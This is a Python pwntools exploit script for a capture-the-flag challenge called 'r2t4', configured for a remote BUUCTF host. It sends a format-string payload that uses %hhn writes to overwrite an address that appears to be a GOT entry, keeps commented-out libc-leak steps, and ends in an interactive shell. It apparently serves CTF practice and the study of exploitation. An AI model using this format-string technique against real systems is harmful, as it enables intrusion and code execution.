import sys
from pwn import *
from ctypes import *
from pwn_debug.pwn_debug import *
binary='r2t4'
elf=ELF(binary)
pdbg=pwn_debug(binary)
pdbg.local("/lib/x86_64-linux-gnu/libc.so.6")
pdbg.debug("2.29")
pdbg.remote('node3.buuoj.cn',27166)
pdbg.context.log_level='debug'
while True :
	# try :
		if len(sys.argv)==1 :
			io=pdbg.run("debug")
			# io=pdbg.run("local")
			libc=pdbg.libc
			one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]
			# one_gadgaet=[0x41602,0x41656,0xdef36]
		else :
			io=pdbg.run("remote")
			# libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			libc=ELF('../../x64libc/libc-2.29.so')
			# one_gadgaet=[0x4f2c5,0x4f322,0x10a38c]
			one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]


		
		def fmt(off,addr1,addr2):

			arg0=(addr1)&0xff
			arg1=(addr1&0xff00)>>8
			# arg2=(addr1&0xffff00)>>8
			# arg3=(addr1&0xff000000)>>24
			# arg4=(addr1&0xff00000000)>>32
			# arg5=(addr1&0xff0000000000)>>40
			# arg6=(addr1&0xff000000000000)>>48
			# arg7=(addr1&0xff00000000000000)>>56
			
			
			
			pay1='%'+str(arg0)+'c%'+str(off+4)+'$hhn'
			pay2='%'+str((arg1-arg0+0x100)%0x100)+'c%'+str(off+5)+'$hhn'
			# pay3='%'+str((arg2-arg1+0x100)%0x100)+'c%'+str(off+6)+'$hhn'
			# pay4='%'+str((arg3-arg2+0x100)%0x100)+'c%'+str(off+13)+'$hhn'
			# pay5='%'+str((arg4-arg3+0x100)%0x100)+'c%'+str(off+14)+'$hhn'
			# pay6='%'+str((arg5-arg4+0x100)%0x100)+'c%'+str(off+15)+'$hhn'
			# pay7='%'+str((arg6-arg5+0x100)%0x100)+'c%10$hhn'
			# pay8='%'+str((arg7-arg6+0x100)%0x100)+'c%10$hhn'
			
			pay=pay1+pay2#+pay3#+pay4+pay5+pay6
			pay=pay.ljust(0x20,'\x00')
			for i in range(3):
				pay+=p64(addr2+i)
			io.send(pay)


		pay=fmt(6,0x400626,0x000000000601018)

		# libc_base=u64(io.recvuntil('\x7f')[-6:]+'\x00\x00')-libc.sym['__malloc_hook']-88-0x10
		# libc.address=libc_base
		# system_addr=libc.sym['system']
		# bin_sh_addr=libc.search('/bin/sh\x00').next()
		# success('libc_base:'+hex(libc_base))
		# pdbg.bp([])
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue